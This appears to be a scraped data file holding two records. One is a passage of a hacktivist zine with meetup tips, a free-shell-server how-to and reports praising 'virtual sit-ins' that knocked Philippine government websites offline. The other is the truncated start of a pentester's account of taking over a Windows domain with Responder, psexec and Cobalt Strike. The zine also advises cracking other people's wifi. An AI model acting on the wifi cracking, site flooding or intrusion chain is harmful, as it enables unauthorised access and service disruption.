new people in. Once\r\nyour core group has decided a date and space for your first meeting, make some\r\nflyers and posters. Put together an announcement explaining that you are trying\r\nto get this group together and that you are having an initial planning meeting\r\nat this place at this time: all are welcome. Send it off to relevant local\r\ngroups as well as online networking sites like indymedia, craigslist, even\r\nmyspace or tribe.net. Attend local meetings and hand out flyers. And get your\r\nfriends together and make sure they bring cool tricks + ideas for the first\r\nmeeting.\r\n\r\n* Meet!\r\nThe day of the meeting will come and once you get people in the space with all\r\nthe right ingredients it's time to get it started! Make sure you introduce new\r\npeople to existing members and create a friendly and accomodating environment\r\nwhere people can express themselves and introduce new ideas. After initially\r\nsocializing and enough people have showed, it's time for the formal meeting.\r\n\r\nRound table meetings are usually the best way for everybody to hear each other\r\nand create a friendly equal and open environment for new people to introduce new\r\nideas. If there are a lot of people or a lot of things that need to be discussed\r\nthen a meeting facilitator and an agenda is probably needed. So announce that\r\nthe meeting is starting, circle up chairs + tables so everyone can face each\r\nother and be in on the discussion and start with introductions. Go around the\r\nroom and give everybody a chance to introduce themselves + their skills and\r\ninterests. Afterwards, create time to brainstorm items to be discussed and added\r\nto the agenda (useful for the facilitator or notetaker). Then go over each\r\nagenda item one by one bringing up issues proposing and deciding on ideas.\r\n\r\nAs it is your first meeting there are probably lots of agenda items to bring up\r\nso the group can decide it's identity, prioritize it's goals, and brainstorm\r\nfuture ideas for growth. Think about points of unity + strucure of the group\r\n(democracy, consensus, open, etc). What would be a good time/date/location for\r\nnext meeting (monthly meetings at regular dates?). Pool together resources for\r\nthe group and think about and propose ways people can get a hold of each other\r\n(pass around a sheet to collect emails or #s). Start an email list, message\r\nboard, blog, or website. Brainstorm ideas for presentations, workshops, or other\r\nspecial events(possibilities listed below). Finally, announce other upcoming\r\nactions, groups, and decide on the next meeting.\r\n\r\nIF YOU ARE STARTING GATHERINGS IN YOUR AREA, WEW OULD LIKE TO HEAR ABOUT IT!\r\nGet in touch with the global hackbloc collective so that we can help cross\r\npromote your local groups.

Get involved at hackbloc.org or email\r\nhackbloc@gmail.com\r\n\r\nPossible Ideas for Workshops and Presentations\r\n* Hold workshops on online security culture: showing people how to use and\r\ninstall tor/privoxy(secure proxy through onion routing), using SSL on IRC, off\r\nthe record(for secure AIM chats), pgp/gpg, how to clear your system of temporary\r\nfiles, internet caches, \"deleted\" files, etc\r\n\r\n* Explore alternatives to copyrights / anti-copyright activism: have a 'pirate\r\nfile share fest', set up file servers on the network, promoting creative commons\r\n/ copyleft / anti-copyright media and projects\r\n\r\n* Have a \"linux fest\" and play with various distros and livecds, encouraging\r\npeople to bring their machines + install or dual boot linux\r\n\r\n* Play the HTS challenges to learn the basics of web hacking in a realistic\r\nenvironment\r\n\r\n* Have a web development / programming party and make a site for the group\r\n\r\n* Host hacker wargames competitions and code auditing workshops - we can several\r\nLAMP systems(perhaps with non-permanent environments, like making a customzied\r\nlivecd) and install several open source CMS systems to practice remote intrusion\r\nand defense while playing \"king of the hill\"\r\n\r\n* Bring lockpicks + invite people to bring various locks to practice on\r\n\r\n* USE YOUR IMAGINATION\r\n\r\n################################################################################\r\n#             HOW TO: Start A Free Shell Server / Pirate Wifi Node             #\r\n################################################################################\r\n\r\nIf you have machines lying around and have a relatively fast and stable internet\r\nconnection, consider opening it up to the world to be used as a free shell\r\nserver or pirate node.\r\n\r\n* free shell server - give people the chance to play around with linux\r\n* file server - allow people to swap files with other users on the system. you\r\ncan set up sftp/ssh, ftpd, or some sort of web based upload / file listing\r\nsystem.\r\n* tor node - if you have lots of bandwidth, consider setting up a tor exit node\r\n. this has the added advantage of allowing any possible law enforcement on your\r\nnetwork to not be able to distinguish random tor server traffic from your\r\npersonal communications being routed through tor.\r\n\r\nSetting up Free Shells\r\nIf you don't want to have to create accounts for people manually, you can use a\r\nfew scripts to automate the process. In this article, we are going to describe a\r\nsystem which had been developed and used by Hairball with the HBX Free Shell\r\nproject.\r\n\r\nWe create a 'new' user account that people would log onto to create their own\r\naccount; and instead of bash or sh, this account's shell would be set in\r\n/etc/passwd to refer to a binary stored on your system which would prompt the\r\nuser for their desired username and create the account and their home directory.\r\n\r\n\r\nThe program is essentially a perl script wrapped in a SUID binary written in C.\r\nThe source code can be located at:\r\ndisrespectcopyrights.net/archive/Code/new.pla.txt\r\n\r\nIf you are worried about being shut down, receiving cease-and-desist notices, or\r\nbeing raided by law enforcement, consider disguising the source IP of the server\r\nusing Tor Hidden Services. This allows you to set up an anonymous domain name\r\nthat is only accessible to others browsing through Tor, where the source IP of\r\nyour server is obfuscated by routing through the tor network in reverse.\r\n\r\nIf you have two wireless cards, and there are password protected wireless\r\nnetworks, you can crack the network and set up your own network to redistribute\r\nthe internet access from the first.\r\n\r\n                     -####################################-\r\n                     -####           ACTION            ###-\r\n                     -####################################-\r\n\r\n################################################################################\r\n#                International Solidarity to Free the Sagada 11                #\r\n################################################################################\r\n\r\nTwo of the Sagada 11 Freed!\r\n TWO among the eleven tortured and illegally arrested backpackers also known as\r\nthe SAGADA11, were already released from La Trinidad District Jail on May 30,\r\nAsian Commission on Human Rights (AHRC) said, Thursday night. \r\n\r\nMinors Frencess Ann Bernal (15) and Ray Lester Mendoza (16) were released from\r\nLa Trinidad District Jail after the court granted the earlier petition by their\r\nlegal counsel to turn them over to their parents. The two minors were amongst\r\nthe 11 torture victims detained in La Trinidad, Benguet. They were illegally\r\narrested in February 14, 2006 at Buguias Checkpoint by Police authorities who\r\nclaimed that they were in \"hot pursuit\" of suspected Armed Rebels. \r\n\r\n In a separate newspaper report, Judge Agapito Laoagan Jr. ruled the\r\n\"warrantless\" arrest by the police as illegal as it did not fall under the\r\nprinciple of a \"hot pursuit\" operation. Under arrests made by virtue of \"hot\r\npursuit\" operations, warrants may not be required. Further, the arrests should\r\nbe made within hours from the commission of the crime.\r\n\r\n\r\nSagada11 Solidarity Action Held in Spain\r\nby Jong Pairez (Indymedia Volunteer)\r\nNEWSBREAK! (3/14/2006) Police authorities asked the Quezon City judge to issue a\r\nsearch warrant for Philippine Center for Investigative Journalism (PCIJ)\r\nheadquarters, late this afternoon. The request for the warrant issue is\r\napparently in connection with inciting to sedition charges that similarly forced\r\na local newspaper to shutdown, last month. \r\n\r\nBARCELONA, Spain-- Protest Banners were hanged outside the Philippine Embassy,\r\nsurprising passersby in Barcelona, yesterday (March 13), by a group of unnamed\r\nSpanish activists, saying, \"Basta de Torturas en las Filipinas (enough torture\r\nin the Philippines)\" and \"11 de Sagada LIBERTAD! (free the Sagada 11!)\" \r\n\r\n Leaflets were also distributed, informing passersby about the rampant Human\r\nRights violation in the Philippines under the Arroyo Regime. The group of\r\nSpanish activists who did a small solidarity action for the unconditional\r\nrelease of Sagada 11, specifically condemned the illegal arrest and violent\r\ntorture suffered by the eleven young backpackers from the hands of Philippine\r\nauthorities. \r\n\r\n TOKYO AND THE SAGADA 11\r\n\r\n\"As everyone gathers for food prepared by a vegan guerrilla kitchen collective\r\nknown as Kaizouku Cafe, Poets were already breathing metaphors of burning\r\nMolotov cocktails in their hands, making words as bullets for a calibre pistol\r\nthat can strike an enemy in one blow.\"\r\n\r\n It was Saturday night in Tokyo, as usual the post-industrial cosmopolitan city\r\nambience is the same, although the season has changed from Winter to Spring (it\r\nis much less colder). Thus, everywhere is noises of ambulance sirens in the\r\nstreets, stressed salary men strolling like living deads, and common music of\r\nmonotonic rhythm from a subway train constitutes the everyday life of an\r\nordinary dweller.\r\n\r\n I just came out from my work somewhere in the posh district of Hiro-o to join\r\nthe closing party of our DIY multi-media artshowÑSeppuku2, which opened last\r\nmonth in Irregular Rhythm Asylum (IRA). It took me thirty minutes before I was\r\nable to get into the venue that is located in Shinjuku. Before I was able to\r\nenter the door of IRA, several of individuals, mostly from the new \"Zengakuren\"\r\ngeneration were already there, sharing food and beer. I thought the night will\r\nbe the same, but it was not.\r\n\r\nSOLIDARITY NIGHT FOR SAGADA 11\r\nThe closing party was a solidarity night. As everyone gathers for food prepared\r\nby a vegan guerrilla kitchen collective known as Kaizouku Cafe, Poets were\r\nalready breathing metaphors of burning Molotov cocktails in their hands, making\r\nwords as bullets for a calibre pistol that can strike an enemy in one blow.\r\nThere was anger, it was anger against all kinds of Authority that strangles the\r\nhuman soul, which has killed and detained a dozen including the eleven innocent\r\nand young hitchhiker punks in the Philippines known as the Sagada 11.\r\n\r\nAfter a while of continuous spontaneity, Sha-do-U of IRA beamed the online\r\npetition campaign to free the Sagada 11 on the wall from his computer. He also\r\nmade a brief speech about the issue.\r\n\r\nThe expression of solidarity came in different ways, but some has pushed the\r\nbutton to include their names on the online petition. Some of them were band\r\nmembers of various punk bands in Tokyo, including Masau of The Urchins.\r\n\r\nKaori of the punk rock bandÑThe Happening, which is considered one of the\r\nlegends in Tokyo punk scene offered a song entitled \"Fuck the Bastards\" in\r\nacoustic while I was about to drink my third beer. She fluently expressed well\r\nthe same emotion that everybody feels during a confrontation against authority.\r\n\r\nOur night of solidarity continued and every hour was a surprise, while the\r\ncommon life outside is totally predictable. I thought the night is the same, but\r\nit was not until the night has produced a moment of action, of expression and\r\nsolidarity of love.\r\n\r\n** A Freed Sagada 11 Prisoner Speaks Out **\r\nIt's an amazing experience to be a part of a hacktivist action and know that you\r\ncan be anywhere on the planet and like minds exist. The impact that the web sit\r\nin had and the impetuous for it was something to behold. It all started from a\r\nplea from a Filipino to an American (who both happened to be in Japan) to get\r\nthe word out that their friends were jailed and tortured just because their\r\ngovernment thinks punkers are different. These punkers were just helping people\r\nget food for god sake (Food Not Bombs)! The American had contacts and before\r\nlong, the Office of the President and the Philippine National Police websites\r\nwere shut down because hacktivist got involved and helped to get the word out.\r\nFrom there, international press got wind of the situation and the web sit in\r\ngarnered international attention and support. The American returned to the\r\nstates to find out that the action reached the American press. 3 months later, 2\r\nof the prisoners were released and live to tell the situation. I just want\r\npeople to realize that actions matter. Don't sit around thinking you can't make\r\na difference, when no matter where you are you can. Don't EVER let them tell you\r\notherwise. - Sally\r\n\r\nThis is an interview from one of the SAGADA11, her name is Ann, living at\r\nMarikina City Philippines. We interviewed her with a condition that we won't ask\r\nher about what happen or to re-summarized the incident of torture.\r\n\r\nQ: What were you feeling when most of your visitors unfamiliar faces?\r\nA: I'm very much happy, I'd seen the true camaraderie really stands for,\r\nthinking that we are just genre-mates or let say punk-mates.\r\n\r\nQ: Have anyone told you the actions done by the Internet Justice League?\r\nA: Yes,\r\n\r\nQ: What do you know about them?\r\nA: They are the ones that help to spread the issue internationally and they were\r\nthe ones that participated in the virtual sit-in done to pressure the Philippine\r\ngovernment by means of messing with their websites.\r\n\r\nQ: Now that you are now out in jail, tell something about it.\r\nA: At first; we're very much happy, but just after a few days had pass, a police\r\nthat introduced themselves as CHED (Commission on Higher Education)\r\nrepresentatives and was looking for me, fortunately I was out. My mother was\r\nwise enough to trace it with the help of the CHED officials and said that they\r\ndidn't send anyone the look for Ann. In the case of PETRA, someone also came to\r\nhis school and showed some photos; Ray Lester (Petra) with someone in High\r\nstatus of the NPA (New Peoples Army), creating a hearsays, at school that Petra\r\nis a real NPA. We are required to report to the DSWD (Department of Social\r\nWelfare and Development). We are also told that Camp Crame has an eye watching\r\nus, under surveillance\r\n\r\nQ: Aside from being happy, what other emotion arise from being released?\r\nA: I'm somewhat ashame, because people tells me that \"so you are already out in\r\njail\"\r\n\r\nQ: Why are you ashame when people tells you that?\r\nA: Because my family treat me differently. When they tells me that, I'm thinking\r\nthat they believed that I'm what I'm accused of. I'm also ashame also because\r\nthe society is not accustomed to a girl, especially at my age, already got a\r\npiece of taste in jail.\r\n\r\nQ: Treat differently, what do you mean, bad or good treat differently?\r\nA: both bad and good; the society now treats me like I'm the only one that\r\nneeded the help. How about those other person that need more of their reaching\r\narms. I don't what them to treat me baby, different from the other, I just want\r\nthem to treat as what they treated me before.\r\n\r\nQ: Are you studying?\r\nA: Yes, I'm grateful that we've reached the school's enrollment period.\r\n\r\nQ: Now that you are studying. What are your plan?\r\nA: Spend it schooling, time is taking a toll at me.\r\n\r\nQ: How about going to gigs and mobilization/movements?\r\nA: I think going to gigs would be fine, but mobilization, maybe I'll just say\r\npass for now.\r\n\r\n\r\nQ: What is you greatest fear?\r\nA: I don't want that to happened to me or to anyone else anymore.\r\n\r\nQ: You said that you would be lay lowing on the mobilization. How do you plan to\r\ncontribute for you fear not to happen.\r\nA: I've seen many points from that experience. I've seen what is wrong, and\r\nlearned a lot from this experience. All I have to do, is to share this\r\nexperience so that is wouldn't happen to anyone anymore.\r\n\r\nQ: This would be my final question. What do you still need?\r\nA: For me? Maybe your question should be not what i need, but what do the\r\nremaining SAGADA 11 needs?\r\n\r\nQ: What do you think they need?\r\nA: Food is a major need they have to think everyday. Food is given not to\r\nsatisfy their hunger but just for the stomach to be filled with something. I\r\nthink that they need money to accommodate this needs.\r\n\r\nTo send help contact us in liberation_asusual@yahoo.com or pjames_e@yahoo.com.au\r\n\r\n\r\nMANILA: BrigadaElektronica electronic disturbance group strikes again\r\n\r\n\"Technology has boasted that it enables people in getting closer to each other,\r\nso we are going to show that if we can't get closer to Malakanyang and protest,\r\nwe will closely express ourselves inside Malakanyang palace itself by just one\r\nclick,\" says one of the group's technician who want to keep anonymity.\r\n\r\n MANILA-- The current ban of public assemblies and free speech in the streets\r\nhas given birth to online protest action namely- \"electronic sit-in.\"\r\n\r\n BrigadaElektronica electronic disturbance group first introduced electronic\r\nsit-in last year as an online version of support to the striking workers of\r\nGelmart in Metro Manila who then occupied the factory, held a picket line and\r\nobstructed the capitalist boss's activity in laying-off the workers. The group\r\nheld a similar action by occupying (sit-in) the official Gelmart website; of\r\ncourse, the action successfully declared \"no business as usual, workers on\r\nstrike!\" (the Gelmart website literally stopped as thousands of online\r\nparticipants joined the sit-in)\r\n\r\n This time, the electronic disturbance group is once again announcing their\r\nsecond electronic sit-in campaign, targeting the Malakanyang website, PNP and\r\nOffice of the President. The action officially starts on March 23, 2006, it will\r\nlast until the first of April.\r\n\r\n \"Technology has boasted that it enables people in getting closer to each other,\r\nso we are going to show that if we can't get closer to Malakanyang and protest,\r\nwe will closely express ourselves inside Malakanyang palace itself by just one\r\nclick,\" says one of the group's technician who want to keep anonymity.\r\n\r\n The group also said that this electronic sit-in demands the unconditional\r\nrelease of eleven young backpackers including a fifteen-year-old girl who were\r\nillegally arrested, tortured and wrongfully accused as NPA's by Philippine\r\nauthorities, while the innocent-care-free kids were only just hitchhiking on\r\ntheir way to the beautiful Sagada Mountains. \"If the responsible authorities\r\nwill not take heed for the call of these kids' parents who were very much\r\ndishearten for taking away their sons and daughters the freedom to travel;\r\ngovernment websites will virtually be deleted. \" says one of the technicians.\r\n\r\n \"The Benguet Police and Military must also give apologies to the victims of\r\ntheir inhuman activities,\" demands the group.\r\n\r\nComputer-savvy protesters start\r\n'virtual sit-in' campaign \r\n\r\nCOMPUTER-SAVVY Philippine protesters took civil disobedience to cyberspace\r\nThursday, launching a \"virtual sit-in\" campaign that urged online activists to\r\noverwhelm the police Web site with numerous hits.\r\n\r\nProtesting alleged human rights abuses, protesters calling themselves\r\n\"Electronic Brigade\" opened a Web site that directs visitors to the main\r\nnational police site.\r\n\r\n\"You are about to take part in an online direct action protest.

Let's decipher the myth, give basic ideas or\r\nprinciples of Brigada Elektronika on the slate for the stream of conscious\r\nhumanity (left in anyone) to digest.\r\n\r\nErroR: It started as a direct action project to support the striking workers of\r\nGelmart Inc., last year. The mission was to launch a parallel action online. So\r\nbasically, it was the specific mission which binded the group to fulfill the\r\nproject. Obviously, the project is very temporary and momentary. Three\r\nindividuals were involved in this project, one of them was inspired by the\r\nElectronic Disturbance Theatre, hence, the name BrigadaElektronika was born.\r\n\r\nA: Is the goal long term or short lived?\r\n\r\nErroR: We only want to create a snapshot or a spot from memory that will last\r\nuntil time succumbs to death. Therefore, the goal is to let others create their\r\nown moment i.e. direct action(wether it is hacking, sit-in,etc.) Because, to\r\nattain freedom/liberation is neither Long or Short.\r\n\r\nA: Most of the activist circles are rather new to this form of direct action.\r\nCan this be a new wave of method & vantage point for people, when Free Speech is\r\noutlawed when it crosses the line?\r\n\r\nErroR: Yes. Because, as an activist, IMAGINATION is our duty. It is our only arm\r\nto fight all forms of authority that threatens our capacity to think and\r\nexpress.\r\n\r\nA: What are the dynamics of the group. Do you support various struggles that is\r\nnot directly connected with the Brigada Elektronika in organizational basis..\r\n\r\nErroR: The group is so loose, and we dont even consider BrigadaElektronika a\r\ngroup, but rather a name of a project. So in terms of connecting to others in\r\norganizational basis, we prefer our individual capacity to decide and commit in\r\njoining other group's action and projects.\r\n\r\nA: Ive been informed that online/or virtual sit ins are legal in some cases. Can\r\nyou elaborate this to justify attacking several targets including the PNP\r\nservers.\r\n\r\nErroR: There is no law that prohibits anyone to visit a website. It is simple as\r\nthat.\r\n\r\nA: Do you consider yourself a hacker, anarchist if anything.. In times of war,\r\ncommodity & marketed foods with plastic labels. How do you label yourself?\r\n\r\nErroR: I consider myself as a dreamer, struggling to exist in this World who\r\nproclaimed that dreaming is dead.\r\n\r\nA: Few criticisms coming from the elements of poseudo luddites & immature\r\nelements in the counterculture scene view virtual direct actions are mere\r\nassimilation to the machinery of the State. What is your opinion? Do you have\r\nany counter arguments about this..\r\n\r\nErroR: A virus cannot be assimilated by any kind of systems, imagine you are a\r\nvirus. This tiny little virus once it penetrates a system, it can shutdown even\r\nthe most formidable structure.\r\n\r\nA: Lines have been drawn & there is no turning back. Comments, statement you'd\r\nlike to address.. before we wrap this shit up.\r\n\r\nErroR: Things have been tough lately for dreamers. They say dreaming's dead,\r\nthat no one does it anymore. It's not dead, it's just been forgotten. Removed\r\nfrom our language. No one teaches it so no one knows it exists. The dreamer is\r\nbanished to obscurity. Well I'm trying to change all that, and I hope you are\r\ntoo. By dreaming every day.Dreaming with our hands and dreaming with our minds.\r\nOur planet is facing the greatest problems it's ever faced. Ever. So whatever\r\nyou do, don't be bored. This is absolutely the most exciting time we could have\r\npossibly hoped to be alive.\r\n\r\nAnd things are just starting.\r\n \r\n\r\n################################################################################\r\n#                      RICKHARD FALKVINGE : I AM A PIRATE                      #\r\n################################################################################\r\n\r\nhttp://www.piratpartiet.se\r\nhttp://www.pirate-party.us\r\nhttp://www.pp-international.net\r\n\r\n\r\n Friends, citizens, pirates: \r\n\r\n There is nothing new under the Sun. \r\n\r\n My name is Rickard Falkvinge, and I am the leader of the Pirate Party. \r\n\r\n During the past week we have seen a number of rights violations taking place.\r\nWe have seen the police misusing their arresting rights. We have seen innocent\r\nparties being harmed. We have seen how the media industry operates. We have seen\r\nhow the politicians up to the highest levels bend backwards to protect the media\r\nindustry. \r\n\r\n This is scandalous to highest degree. This is the reason why we are here today.\r\n\r\n\r\n The media industry wants us to believe that this is a question about payment\r\nmodels, about a particular professional group getting paid. They want us to\r\nbelieve that this is about their dropping sales figures, about some dry\r\nstatistics. But that is only an excuse. This is really about something totally\r\nelse. \r\n\r\n To understand today's situation in the light of the history, we must go back\r\n400 years - to the time when the Church had the monopoly over both culture and\r\nknowledge. Whatever the Church said, was the truth. That was pyramid\r\ncommunication. You had one person at the top talking to the many under him in\r\nthe pyramid. Culture and knowledge had a source, and that source was the Church.\r\n\r\n\r\n And God have mercy on those who dared to challenge the culture and knowledge\r\nmonopoly of the Church! They were subjected to the most horrible trials that man\r\ncould envision at the time. Under no circumstances did the Church allow its\r\ncitizens to spread information on their own. Whenever it happened, the Church\r\napplied its full judicial powers to obstruct, to punish, to harass the guilty\r\nones. \r\n\r\n There is nothing new under the Sun. \r\n\r\n Today we know that the only right thing to happen for the society to evolve was\r\nto let the knowledge go free. We know now that Galileo Galilei was right. Even\r\nif he had to puncture a monopoly of knowledge. \r\n\r\n We are speaking here about the time when the Church went out in its full force\r\nand ruled that it was unnecessary for its citizens to learn to read or to write,\r\nbecause the priest could tell them anyway everything they needed to know. The\r\nChurch understood what it would mean for them to lose their control. \r\n\r\n Then came the printing press. \r\n\r\n Suddenly there was not only a source of knowledge to learn from, but a number\r\nof them. The citizens, who at this time had started to learn to read, could take\r\ntheir own part of the knowledge without being sanctioned. The Church went mad.\r\nThe royal houses went mad. The British Royal Court went as far as to make a law\r\nthat allowed the printing of books only to those print owners who had a special\r\nlicense from the Royal Court. Only they were allowed to multiply knowledge and\r\nculture to the citizens. \r\n\r\n This law was called \"copyright\". \r\n\r\n Then a couple of centuries passed, and we got the freedom of press. But\r\neverywhere the same old model of communication was still being used: one person\r\ntalking to the many. And this fact was utilized by the State who introduced the\r\nsystem of \"responsible publishers\". \r\n\r\n The citizens could admittedly pick pieces of knowledge to themselves, but there\r\nalways had to be somebody who could be made responsible if, what a horrible\r\nthought, somebody happened to pick up a piece of wrong knowledge. \r\n\r\n And this very thing is undergoing a fundamental change today - because the\r\nInternet does not follow the old model anymore. We not only download culture and\r\nknowledge. We upload it to others at the same time. We share files. The\r\nknowledge and the culture have amazingly lost their central point of control. \r\n\r\n And as this is the central point of my speech, let me lay it out in some\r\ndetail. \r\n\r\n Downloading is the old mass media model where there is a central point of\r\ncontrol, a point with a 'responsible publisher', somebody who can be brought to\r\ncourt, forced to pay and so on. A central point of control from where everybody\r\ncan download knowledge and culture, a central point that can grant rights and\r\ntake them away as needed and as wanted. \r\n\r\n Culture and knowledge monopoly. Control. \r\n\r\n Filesharing involves simultaneous uploading and downloading by every connected\r\nperson. There is no central point of control at all; instead we have a situation\r\nwhere the culture and the information flow organically between millions of\r\ndifferent people. \r\n\r\n Something totally different, something totally new in the history of human\r\ncommunications. There is no more a person that can be made responsible if wrong\r\nknowledge happens to spread. \r\n\r\n This is the reason why the media corporations talk so much about 'legal\r\ndownloading'. Legal. Downloading. It is because they want to make it the only\r\nlegal way of things for people to pick up items from a central point that is\r\nunder their control. Downloading, not filesharing. \r\n\r\n And this is precisely why we will change those laws. \r\n\r\n During the passed week we have seen how far an acting party is prepared to go\r\nto prevent the loss of his control. We saw the Constitution itself being\r\nviolated. We saw what sort of methods of force and attacks on personal integrity\r\nthe police is prepared to apply, not to fight crime, but in an obvious intention\r\nto harass those involved and those who have been close to them. \r\n\r\n There is nothing new under the Sun, and the history always repeats itself. This\r\nis not about a group of professionals getting paid. This is about control over\r\nculture and knowledge. Because whoever controls them, controls the world. \r\n\r\n The media industry has tried to make us feel shame, to say that what we are\r\ndoing is illegal, that we are pirates. They try to roll a stone over us. Take a\r\nlook around today, see how they have failed. Yes, we are pirates. But whoever\r\nbelieves that it is shameful to be a pirate, has got it wrong. It is something\r\nwe are proud of. \r\n\r\n That is because we have already seen what it means to be without central\r\ncontrol. We have already tasted, felt and smelled the freedom of being without a\r\ntop-down controlled monopoly of culture and knowledge. We have already learned\r\nhow to read and how to write. \r\n\r\n And we do not intend to forget how to read and how to write, even if\r\nyesterday's media interests do not find it acceptable. \r\n\r\n MY NAME IS RICKARD, AND I AM A PIRATE!\r\n \r\n################################################################################\r\n#                       I played Urban Capture the Flag                        #\r\n################################################################################\r\n \r\n chicago urban capture the flag meets on the second saturday of every month at\r\n6pm in wicker park - milwaukee north and damen off the damen blue line\r\n \r\nWhat did you do last night?\r\n\r\nI can tell you what I did.\r\n\r\nI played Urban Capture the Flag,\r\nmother fucker.\r\n\r\nI saw signs and posters\r\nand little handbills all over\r\nWicker Park for the past couple weeks.\r\n\r\n\"Reclaim the City\"\r\n\"play Urban Capture the Flag\"\r\n\r\nwith a map,\r\na city grid,\r\nalmost a square mile,\r\nseparated by a great dividing\r\nline known as Milwaukee avenue.\r\n\r\nAnd, an awesome little drawing\r\nof a dude with a beard running with a flag.\r\n\r\nIt said to show up at the Damen\r\nBlue Line train stop at 7 pm.\r\n\r\nI did.\r\n\r\nI had nothing else to do.\r\n\r\nIt's strange,\r\nthese days,\r\nwhen I don't have a gig\r\non a weekend,\r\nI never really have anything to do.\r\n\r\nSo I show up for summer camp\r\ngames in cold weather and light rain.\r\n\r\nthere, at the train stop,\r\nI met 30 perfect strangers.\r\n\r\nwe divided into two perfect teams.\r\n\r\nThey were mostly strangers\r\nto eachother, a few pockets\r\nof friends here and there,\r\nbut mostly just the bored,\r\ncurious, and adventurous\r\ntype who would show up\r\nfor such an event.\r\n\r\nWide demographic,\r\npunks and yuppies\r\nand thirty-somethings\r\nand a gay guy, and a tall\r\nJesus looking character,\r\nand a girl who told me she finds\r\nperfectly good bagels in the dumpster.\r\n\r\nWe got little bandanas to distinguish teams,\r\nand we hid our flags and planned our strategy.\r\n\r\nand we were off.\r\n\r\nAnd I felt like I was in Die-Hard\r\nand the Bourne-Identity for the next three hours.\r\n\r\nIt was awesome.\r\n\r\nWe snuck around the city,\r\nin two and threes,\r\nand solo advances.\r\n\r\nOnce we crossed into enemy\r\nterritory, we were vulnerable\r\nto capture and imprisonment.\r\n\r\nBut we were not alone in the streets,\r\nit was Wicker Park on a Saturday night,\r\nwe could try to blend in,\r\nalways looking out for a bastard\r\nwith a white bandana.\r\n\r\nAnd if you saw one,\r\nyou ran.\r\n\r\nI ran like I haven't run\r\nsince I was fourteen.\r\n\r\nrunning for my life,\r\nas if nothing else mattered\r\nin the world except to get\r\nback over Milwaukee Avenue.\r\n\r\nWhen was the last time you\r\ndid a full on sprint until you just\r\ncouldn't run anymore?\r\n\r\nFor me, its been a while.\r\n\r\nI don't find myself sprinting\r\nso often these days.\r\n\r\nbut last night,\r\nI ran like the wind,\r\nuntil the wind was completely\r\nout of my body and spilled\r\nall over the streets.\r\n\r\nToday, I am sore,\r\nbut I am also grateful\r\nfor such an evening of unexpected fun.\r\n\r\nI met people I would never ordinarily meet.\r\n\r\nI learned that you can find perfectly good bagels\r\nin the right dumpsters.\r\n\r\nI smoked a bowl with the leaders of the event,\r\na pair of twin activists.\r\n\r\nMan, are they interesting cats.\r\n\r\nthey do stuff,\r\nanything, they just\r\nseem to want to take action,\r\nbe heard, have fun,\r\nget noticed, make a statement,\r\nhave other people wonder about them\r\ninstead of wondering about a TV\r\nfull of artificially sweetened famous people.\r\n\r\nLast night,\r\nthey chose Capture the flag.\r\nand it was quite a success.\r\n\r\n3 hours long,\r\n30+ strangers showing up\r\non a cold, wet night.\r\n\r\nThey have my email address,\r\nand I'm going to show up\r\nat whatever they do next.\r\n\r\nNow if you'll excuse me,\r\nI have to write a theme song\r\nfor the Rat Patrol.\r\n\r\nthose are the guys who\r\nride around Chicago on\r\nthose big, tall, crazy bikes.\r\n\r\nI met a few last night,\r\nand they need a theme song.\r\n\r\n################################################################################\r\n#                                   CREDITS                                    #\r\n################################################################################\r\n                                   \r\n               ** HACK THIS ZINE #4: AMMO FOR THE INFO-WARRIOR **               \r\n\r\nWe are an independent collective of creative hackers, crackers, artists and\r\nanarchists.

Hackers were dreamers who saw through\r\nthis world and its oppressive institutions. Hackers were brilliant maniacs who\r\ndefined themselves against a system of capitalist relations, and lived their\r\nlives in opposition. Every aspect of the hacker's life was a tension towards\r\nfreedom -- from creating communities that shared information freely, to using\r\nthat information in a way that would strike out against this stifiling world.\r\nWhen nobody understood how technology worked in the systems that surrounded us,\r\nhackers figured those systems out and exploited them to our advantage. Hackers\r\nwere criminals, yes, but their crimes were defined by the laws of the\r\ninstitutions that they sought to destroy. While they were consistently portrayed\r\nas criminals by those institutions, their true crimes were only those of\r\ncuriousity, freedom, and the strength to dream of a better world.\r\n\r\nSomewhere along the way the ruling class started paying hackers to defend the\r\nvery systems that they had so passionately attacked. Originally we took these\r\njobs while smiling out of the corners of our mouths, thinking that we were only\r\ntricking those in control. But at some point we tricked ourselves. Where power\r\ndoes not break you, it seduces you - and seduced by the siren song of commodity\r\nrelations, we lost sight of our dreams and desires. Instead of striking out to\r\ncreate a new world, we found ourselves writing facial reconition software that\r\nsought to preserve this one at all costs.\r\n\r\nToday, the attempts at revival of hacker culture make hackers nothing more than\r\nmere hobbyists. We pat ourselves on the back and smile about how we're really\r\nhackers again, that we've gotten back to tinkering, that we're doing interesting\r\nthings with LEDs once more. But this tinkering is only the shadow of its former\r\nself. Asking for the right to modify a commodity that has been sold to us does\r\nnot challenge anything. These projects only help to create bigger cages or\r\nlonger leashes, recuperating our desires and satisfying our sense of ingenuity\r\nby putting wall paper on this ugly world.\r\n\r\nBut some of us still wipe our asses with white papers and dream dangerously. If\r\nyou're not satisfied with people modifying their SUVs and being called hackers,\r\nlook around, find those of us who aren't either, and hack the planet.\r\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"]}

{"_type": ["Papers"], "title": ["A day in the life of a pentester: How I owned your domain in 4 hours"], "platform": ["Multiple"], "published": ["2016-09-15"], "cve": [": "], "desc": ["## A day in the life of a pentester: How I owned your domain in 4 hours \r\n\r\nArrived onsite, sat down, plugged in.\r\n\r\nStarted **Responder** (https://github.com/SpiderLabs/Responder), start **nbtscan**ning /24\r\n\r\n- **Responder**: Spoofs **NBTNS** and **LLMNR** responses, get **NetNTLMv2** hashed passwords for domain users back in response\r\n- **nbtscan** - Uses **NetBIOS** to get computer names/IPs from almost every host on subnet, very very quickly\r\n\r\n> **Why**: The first step is to start gathering information about the environment. Most monitoring solutions will not detect nbtscan activity, and Responder is an easy win if their password policy is poor.\r\n\r\n- - - \r\n\r\nCracked some creds gathered from Responder, and used **Metasploit’s smb_login** to check across subnet for local administrator.\r\n\r\n> Why: Slow checking of valid credentials (one attempt every 30 seconds or so) with smb_login will show systems where the compromised credentials allow _Local Adminstrator access.\r\n\r\n- - - \r\n \r\nA couple systems had local admin from those creds, used local admin access to **psexec (executes a command or spawns a service, requires local admin or access to ADMIN$ share in Windows), spawn Cobalt Strike Beacons on those hosts.\r\n\r\n- **Cobalt Strike** is an advanced red team framework, uses an implant called Beacon to control hosts.\r\n- **Beacon** can communicate over **DNS**, **HTTPS**, **HTTP**, or **SMB**. In this case, I used 